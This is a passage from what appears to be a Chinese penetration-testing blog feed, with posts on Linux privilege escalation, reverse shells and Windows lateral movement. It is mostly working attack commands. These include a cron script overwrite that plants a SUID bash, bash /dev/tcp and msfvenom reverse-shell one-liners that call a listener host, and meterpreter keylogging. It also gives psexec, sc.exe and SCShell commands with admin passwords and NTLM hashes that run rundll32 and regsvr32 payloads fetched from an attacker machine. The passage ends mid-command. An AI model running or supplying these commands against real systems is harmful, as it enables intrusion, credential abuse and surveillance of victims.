class="hljs-keyword">checkpoint</span>，可以自定义输出你想的信息**<br></code></pre></div></td></tr></table></figure><h2 id="计划任务——sh文件覆盖"><a href="#计划任务——sh文件覆盖" class="headerlink" title="计划任务——sh文件覆盖"></a>计划任务——sh文件覆盖</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>crontab<br>ls -l <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>overwrite.sh<br><br><span class="hljs-comment">#root权限运行</span><br>chmod o=rw <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>overwrite.sh<br>echo <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt;&gt; <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>overwrite.sh<br></code></pre></div></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/sagishahar-zz/lpeworkshop">https://github.com/sagishahar-zz/lpeworkshop</a><br><a href="http://www.yidianzixun.com/article/0JgQeL8j?searchword=linux">利用通配符进行Linux本地提权</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux反弹shell</title>
    <link href="/2020/11/14/12-x/"/>
    <url>/2020/11/14/12-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV15y4y1q7z8">linux系统40多种不同类型的反弹shell</a></p><ol><li><p>linux比windows反弹shell的手法要多得多</p></li><li><p>msf的shellcode加载器msfvenom<br>msfvenom -l payload |grep  cmd/unix<br>如何查找自己需要的shellcode类型</p></li><li><p>40多种linux反弹shell的手法</p></li><li><p>反弹shell攻击的防御</p></li></ol><h2 id="msfvenom一句话反弹shell"><a href="#msfvenom一句话反弹shell" class="headerlink" title="msfvenom一句话反弹shell"></a>msfvenom一句话反弹shell</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">cmd/unix/bind_awk                                   Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via GNU AWK<br>cmd/unix/bind_busybox_telnetd                       Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via BusyBox telnetd<br>cmd/unix/bind_inetd                                 Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> (persistent)<br>cmd/unix/bind_jjs                                   Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via jjs<br>cmd/unix/bind_lua                                   Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via Lua<br>cmd/unix/bind_netcat                                Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via netcat<br>cmd/unix/bind_netcat_gaping                         Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via netcat<br>cmd/unix/bind_netcat_gaping_ipv6                    Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via netcat<br>cmd/unix/bind_nodejs                                Continually listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via nodejs<br>cmd/unix/bind_perl                                  Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via perl<br>cmd/unix/bind_perl_ipv6                             Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via perl<br>cmd/unix/bind_r                                     Continually listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via R<br>cmd/unix/bind_ruby                                  Continually listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via Ruby<br>cmd/unix/bind_ruby_ipv6                             Continually listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via Ruby<br>cmd/unix/bind_socat_udp                             Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via socat<br>cmd/unix/bind_stub                                  Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> (stub only, <span class="hljs-keyword">no</span> payload)<br>cmd/unix/bind_zsh                                   Listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via Zsh. <span class="hljs-keyword">Note</span>: Although Zsh is often available, please be aware it isn&#x27;t usually installed <span class="hljs-keyword">by</span> default.<br>cmd/unix/generic                                    Executes the supplied command<br>cmd/unix/interact                                   Interacts with a <span class="hljs-keyword">shell</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">an</span> established socket connection<br>cmd/unix/pingback_bind                              Accept a connection, send a UUID, then <span class="hljs-keyword">exit</span><br>cmd/unix/pingback_reverse                           Creates a socket, send a UUID, then <span class="hljs-keyword">exit</span><br>cmd/unix/reverse                                    Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> through <span class="hljs-keyword">two</span> inbound connections<br>cmd/unix/reverse_awk                                Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via GNU AWK<br>cmd/unix/reverse_bash                               Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via bash&#x27;s builtin /dev/tcp. This will not work <span class="hljs-keyword">on</span> circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.<br>cmd/unix/reverse_bash_telnet_ssl                    Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via mkfifo and telnet. This method works <span class="hljs-keyword">on</span> Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included <span class="hljs-keyword">on</span> some systems to encrypt using SSL.<br>cmd/unix/reverse_bash_udp                           Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via bash&#x27;s builtin /dev/udp. This will not work <span class="hljs-keyword">on</span> circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.<br>cmd/unix/reverse_jjs                                Connect back and create a command <span class="hljs-keyword">shell</span> via jjs<br>cmd/unix/reverse_ksh                                Connect back and create a command <span class="hljs-keyword">shell</span> via Ksh. <span class="hljs-keyword">Note</span>: Although Ksh is often available, please be aware it isn&#x27;t usually installed <span class="hljs-keyword">by</span> default.<br>cmd/unix/reverse_lua                                Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via Lua<br>cmd/unix/reverse_ncat_ssl                           Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via ncat, utilizing ssl mode<br>cmd/unix/reverse_netcat                             Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via netcat<br>cmd/unix/reverse_netcat_gaping                      Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via netcat<br>cmd/unix/reverse_nodejs                             Continually listen <span class="hljs-keyword">for</span> a connection and spawn a command <span class="hljs-keyword">shell</span> via nodejs<br>cmd/unix/reverse_openssl                            Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> through <span class="hljs-keyword">two</span> inbound connections<br>cmd/unix/reverse_perl                               Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via perl<br>cmd/unix/reverse_perl_ssl                           Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via perl, uses SSL<br>cmd/unix/reverse_php_ssl                            Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via php, uses SSL<br>cmd/unix/reverse_python                             Connect back and create a command <span class="hljs-keyword">shell</span> via Python<br>cmd/unix/reverse_python_ssl                         Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via python, uses SSL, encodes with base64 <span class="hljs-keyword">by</span> design.<br>cmd/unix/reverse_r                                  Connect back and create a command <span class="hljs-keyword">shell</span> via R<br>cmd/unix/reverse_ruby                               Connect back and create a command <span class="hljs-keyword">shell</span> via Ruby<br>cmd/unix/reverse_ruby_ssl                           Connect back and create a command <span class="hljs-keyword">shell</span> via Ruby, uses SSL<br>cmd/unix/reverse_socat_udp                          Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via socat<br>cmd/unix/reverse_ssh                                Connect back and create a command <span class="hljs-keyword">shell</span> via SSH<br>cmd/unix/reverse_ssl_double_telnet                  Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> through <span class="hljs-keyword">two</span> inbound connections, encrypts using SSL via <span class="hljs-string">&quot;-z&quot;</span> option<br>cmd/unix/reverse_stub                               Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> through <span class="hljs-keyword">an</span> inbound connection (stub only, <span class="hljs-keyword">no</span> payload)<br>cmd/unix/reverse_tclsh                              Creates <span class="hljs-keyword">an</span> interactive <span class="hljs-keyword">shell</span> via Tclsh<br>cmd/unix/reverse_zsh                                Connect back and create a command <span class="hljs-keyword">shell</span> via Zsh. <span class="hljs-keyword">Note</span>: Although Zsh is often available, please be aware it isn&#x27;t usually installed <span class="hljs-keyword">by</span> default.<br>tty/unix/interact                                   Interacts with a TTY <span class="hljs-keyword">on</span> <span class="hljs-keyword">an</span> established socket connection<br></code></pre></div></td></tr></table></figure><h2 id="常用一句话反弹shell命令速查"><a href="#常用一句话反弹shell命令速查" class="headerlink" title="常用一句话反弹shell命令速查"></a>常用一句话反弹shell命令速查</h2><p>linux cmd</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">handler</span> -H <span class="hljs-number">10.10.14.7</span> -P <span class="hljs-number">6678</span> -p cmd/unix/reverse_bash<br><br><span class="hljs-attribute">msfvenom</span> -p cmd/unix/reverse_bash LHOST=<span class="hljs-number">10.10.14.7</span> LPORT=<span class="hljs-number">6678</span> -f raw<br><br><span class="hljs-attribute">0</span>&lt;&amp;<span class="hljs-number">43</span>-;exec <span class="hljs-number">43</span>&lt;&gt;/dev/tcp/<span class="hljs-number">192.168.123.123</span>/<span class="hljs-number">6678</span>;sh &lt;&amp;<span class="hljs-number">43</span> &gt;&amp;<span class="hljs-number">43</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">43</span><br></code></pre></div></td></tr></table></figure><p>python reverse</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">handler -H 192.168.123.123 -P 6688 -p cmd/unix/reverse_python<br><br>msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=192.168.123.123 <span class="hljs-attribute">LPORT</span>=6688 -f<span class="hljs-built_in"> raw</span><br><span class="hljs-built_in"></span><br></code></pre></div></td></tr></table></figure><p>session -u $session-id</p><p>可以新建一个meterpreter类型的session。</p><p>得到meterpreter的session以后</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">keyscan_start</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">keyscan_dump</span><br></code></pre></div></td></tr></table></figure><p>可以进行键盘记录</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://gtfobins.github.io/gtfobins/jjs/#reverse-shell">https://gtfobins.github.io/gtfobins/jjs/#reverse-shell</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python</a></li><li>msf unix/cmd/</li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>零组镜像导航页</title>
    <link href="/2020/10/24/09-x/"/>
    <url>/2020/10/24/09-x/</url>
    
    <content type="html"><![CDATA[<p>零组文库：<br><a href="https://www.ddosi.com/b442/#%E9%9B%B6%E7%BB%84%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80">https://www.ddosi.com/b442/#%E9%9B%B6%E7%BB%84%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80</a></p><p>为什么要录视频，视频和文章有什么区别</p><ol><li><p>你自己都不会，你拿什么给别人讲懂呢？</p></li><li><p>避免自己遗忘，加深理解</p></li><li><p>交到同行业的朋友（目前已达成大部分目标，粉丝1500+）</p></li></ol><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://github.com/fatedier/frp/releases/download/v<span class="hljs-number">0</span>.<span class="hljs-number">34</span>.<span class="hljs-number">1</span>/frp_<span class="hljs-number">0</span>.<span class="hljs-number">34</span>.<span class="hljs-number">1</span>_linux_amd<span class="hljs-number">64</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxvf frp_<span class="hljs-number">0</span>.<span class="hljs-number">34</span>.<span class="hljs-number">1</span>_linux_amd<span class="hljs-number">64</span>.tar.gz<br><span class="hljs-attribute">cd</span> frp_<span class="hljs-number">0</span>.<span class="hljs-number">34</span>.<span class="hljs-number">1</span>_linux_amd<span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><h2 id="主要分为两步骤"><a href="#主要分为两步骤" class="headerlink" title="主要分为两步骤"></a>主要分为两步骤</h2><p>步骤一：配置frp的客户端（无需配置服务端）</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = vps的ip<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>   <span class="hljs-comment">#这个是默认的端口，无需更改</span><br><br><span class="hljs-section">[ssh]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = aaa <span class="hljs-comment">#本地要开放的端口</span><br><span class="hljs-attr">remote_port</span> = bbb  <span class="hljs-comment">#访问vps的哪个端口</span><br></code></pre></div></td></tr></table></figure><p>当frp配置成功以后，访问远程的端口bbb=访问内网的端口aaa</p><p>步骤二：<br>python -m SimpleHTTPServer</p><p>开放内网的服务，让外网能访问到。因为这里开放的是8000端口，所以步骤一的<code>local_port = 8000</code></p><p><code>remote_port = 8000</code>，这个端口可以随便定，只要是vps上没有用过的端口，都可以使用。访问vps:8000，就等于访问内网的8000端口。</p><p>步骤三：运行frp的服务端和客户端</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">【vps】<br>.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br><br>【kali-msf】<br>.<span class="hljs-regexp">/frpc -c ./</span>frpc.ini<br></code></pre></div></td></tr></table></figure><p>步骤四：访问<code>http://vps:8000</code>，就可以成功访问内网的服务了。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-24-09/%E6%9F%90%E5%85%AC%E5%8F%B8%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95.png" alt="某公司云主机安全测试"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sc远程服务横向移动</title>
    <link href="/2020/10/18/10-x/"/>
    <url>/2020/10/18/10-x/</url>
    
    <content type="html"><![CDATA[<h1 id="横向移动手法介绍教程"><a href="#横向移动手法介绍教程" class="headerlink" title="横向移动手法介绍教程"></a>横向移动手法介绍教程</h1><ol><li><a href="https://www.bilibili.com/video/BV1Hz4y1Z7pJ">https://www.bilibili.com/video/BV1Hz4y1Z7pJ</a></li><li><a href="https://www.bilibili.com/video/BV1Hz4y1Z7pJ?p=2">https://www.bilibili.com/video/BV1Hz4y1Z7pJ?p=2</a></li><li><a href="https://www.bilibili.com/video/BV1Hz4y1Z7pJ?p=3">https://www.bilibili.com/video/BV1Hz4y1Z7pJ?p=3</a></li></ol><h2 id="smbmap信息搜集"><a href="#smbmap信息搜集" class="headerlink" title="smbmap信息搜集"></a>smbmap信息搜集</h2><p>远程管理必须使用Admin$</p><p>查看远程共享</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">smbmap</span> -H <span class="hljs-number">192.168.123.45</span><br><br><span class="hljs-attribute">smbmap</span> -u administrator -p <span class="hljs-number">123456</span> -d workgroup -H <span class="hljs-number">192.168.123.45</span><br></code></pre></div></td></tr></table></figure><h2 id="msf-psexec-（成功，不免杀，开启防火墙则无效）"><a href="#msf-psexec-（成功，不免杀，开启防火墙则无效）" class="headerlink" title="msf psexec （成功，不免杀，开启防火墙则无效）"></a>msf psexec （成功，不免杀，开启防火墙则无效）</h2><p>使用的是139，445端口，目标机器必须开放这个端口。</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> impacket-smbserver<br><span class="hljs-number">2.</span> msf psexec<br><br>use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> RHOST <span class="hljs-number">192.168</span><span class="hljs-number">.123</span><span class="hljs-number">.45</span><br><span class="hljs-keyword">set</span> LPORT &lt;<span class="hljs-keyword">Local</span> Port&gt;<br><span class="hljs-keyword">set</span> LHOST &lt;<span class="hljs-keyword">Local</span> IP&gt;<br><span class="hljs-keyword">set</span> SMBUSER &lt;<span class="hljs-keyword">local</span> <span class="hljs-keyword">admin</span> username&gt;<br><span class="hljs-keyword">set</span> SMBPASS &lt;<span class="hljs-keyword">local</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>&gt;<br>exploit<br></code></pre></div></td></tr></table></figure><p>漏洞利用，使用口令去进行命令执行<br>mimikatz，windows明文密码放在桌面，暴力破解，</p><h2 id="psexec-py（成功，不免杀，开启防火墙则无效）"><a href="#psexec-py（成功，不免杀，开启防火墙则无效）" class="headerlink" title="psexec.py（成功，不免杀，开启防火墙则无效）"></a>psexec.py（成功，不免杀，开启防火墙则无效）</h2><p>python /usr/share/doc/python-impacket/examples/psexec.py workgroup/administrator@192.168.123.45 cmd.exe</p><h2 id="sc-exe-（成功，开启防火墙也有效，不免杀）"><a href="#sc-exe-（成功，开启防火墙也有效，不免杀）" class="headerlink" title="sc.exe （成功，开启防火墙也有效，不免杀）"></a>sc.exe （成功，开启防火墙也有效，不免杀）</h2><p>开启rundll32的反弹shell监听服务器，不会的可以看这个视频：<a href="https://www.bilibili.com/video/BV1ey4y1k7PA/">https://www.bilibili.com/video/BV1ey4y1k7PA/</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">激活管理员账号<br>net user administrator /active:yes<br><br>net use <span class="hljs-symbol">\\</span>192.168.123.45<span class="hljs-symbol">\a</span>dmin$ /user:&quot;administrator&quot; &quot;123456&quot;<br><br>net use <span class="hljs-symbol">\\</span>192.168.123.45<span class="hljs-symbol">\a</span>dmin$ /del<br><br>net share可以查看本机开放的资源<br><br>sc <span class="hljs-symbol">\\</span>192.168.123.45 create whaleReverse15 binpath= &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe /c C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\r</span>undll32.exe <span class="hljs-symbol">\\</span>192.168.123.123<span class="hljs-symbol">\A</span>zye<span class="hljs-symbol">\t</span>est.dll,0&quot;<br><br>sc <span class="hljs-symbol">\\</span>192.168.123.45 start whaleReverse15<br></code></pre></div></td></tr></table></figure><h2 id="csexec（能过360，但不能过windows防火墙）"><a href="#csexec（能过360，但不能过windows防火墙）" class="headerlink" title="csexec（能过360，但不能过windows防火墙）"></a>csexec（能过360，但不能过windows防火墙）</h2><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> user administrator <span class="hljs-number">123456</span><br>net use \\<span class="hljs-number">192.168.28.1</span>\admin$ /user:<span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-string">&quot;qwf123!!&quot;</span><br>csexec.exe \\<span class="hljs-number">192.168.28.1</span> cmd.exe<br>操作超时<br><br>net use \\<span class="hljs-number">192.168.123.45</span>\admin$ /user:<span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-string">&quot;123456&quot;</span><br>csexec.exe \\<span class="hljs-number">192.168.123.45</span> cmd.exe<br>没有安装./net2<br><br>net use \\<span class="hljs-number">192.168.123.184</span>\admin$ /user:<span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-string">&quot;123456&quot;</span><br>csexec.exe \\<span class="hljs-number">192.168.123.45</span> cmd.exe<br></code></pre></div></td></tr></table></figure><h1 id="用法有点复杂，没有继续看的工具"><a href="#用法有点复杂，没有继续看的工具" class="headerlink" title="用法有点复杂，没有继续看的工具"></a>用法有点复杂，没有继续看的工具</h1><h2 id="scshell"><a href="#scshell" class="headerlink" title="scshell"></a>scshell</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">使用这篇反弹shell “https://whale3070.github.io/tools/2020/10/04/11-x/”中提到的Regsvr32.exe<br><br>regsvr32 /s /n /u /i:http://192.168.123.123:8080/6IEDA48otwgL.sct<br>生成一个注册表<br><br>SCShell.exe 192.168.123.45 filepermsvc &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe /c C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\r</span>undll32.exe <span class="hljs-symbol">\\</span>192.168.123.123<span class="hljs-symbol">\r</span>DAEep<span class="hljs-symbol">\t</span>est.dll,0&quot; . administrastor 123456<br><br>regsvr32 /s /n /u /i:http://192.168.123.123:8080/6IEDA48otwgL.sct scrobj.dll<br>rundll32.exe <span class="hljs-symbol">\\</span>192.168.123.123<span class="hljs-symbol">\M</span>Jear<span class="hljs-symbol">\t</span>est.dll,0<br><br>python scshell.py -target-ip 192.168.123.45 -service-name filepermsvc -no-cmd &quot; C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\r</span>undll32.exe <span class="hljs-symbol">\\</span>192.168.123.123<span class="hljs-symbol">\r</span>DAEep<span class="hljs-symbol">\t</span>est.dll,0&quot; . administrastor 123456<br><br>SharpMove.exe action=query computername=192.168.123.45 query=&quot;filepermsvc&quot; username=administrastor password=123456<br><br>SCShell.exe 192.168.123.45 filepermsvc &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe /C C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework<span class="hljs-symbol">\v</span>4.0.30319<span class="hljs-symbol">\m</span>sbuild.exe C:<span class="hljs-symbol">\p</span>ayload.csproj&quot; . administrator 123456<br></code></pre></div></td></tr></table></figure><p>2020.10.07</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> scshell.py WORKGROUP/WIN-U<span class="hljs-number">8</span>OIU<span class="hljs-number">3</span>QM<span class="hljs-number">15</span>C@<span class="hljs-number">192.168.123.45</span> -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">58</span>a<span class="hljs-number">478135</span>a<span class="hljs-number">93</span>ac<span class="hljs-number">3</span>bf<span class="hljs-number">058</span>a<span class="hljs-number">5</span>ea<span class="hljs-number">0</span>e<span class="hljs-number">8</span>fdb<span class="hljs-number">71</span><br><span class="hljs-attribute">C</span>:\windows\system<span class="hljs-number">32</span>\cmd.exe /c C:\windows\system<span class="hljs-number">32</span>\rundll<span class="hljs-number">32</span>.exe \\<span class="hljs-number">192.168.123.123</span>\wLWQND\test.dll,<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p>原理：</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">sc config filepermsvc binpath= &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe /c C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\r</span>undll32.exe <br><span class="hljs-symbol">\\</span>192.168.123.123<span class="hljs-symbol">\w</span>LWQND<span 